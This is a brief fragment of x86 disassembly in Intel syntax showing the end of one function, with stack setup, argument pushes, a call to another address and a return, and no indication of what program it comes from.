  4233ac:	add    ecx,0x3272fa
  4233b2:	mov    DWORD PTR [ebp-0x4],ecx
  4233b5:	mov    ecx,DWORD PTR [ebp+0xc]
  4233b8:	push   eax
  4233b9:	mov    DWORD PTR [ebp+0xc],ecx
  4233bc:	push   DWORD PTR [ebp+0xc]
  4233bf:	lea    eax,[ebp-0x4]
  4233c2:	push   DWORD PTR [ebp+0x8]
  4233c5:	push   eax
  4233c6:	push   DWORD PTR [ebp+0xc]
  4233c9:	push   DWORD PTR [ebp-0xc]
  4233cc:	push   DWORD PTR [ebp-0x8]
  4233cf:	call   0x423217
  4233d4:	mov    DWORD PTR [ebp-0x4],eax
  4233d7:	mov    eax,DWORD PTR [ebp-0x4]
  4233da:	leave  
  4233db:	ret    0x8
	...
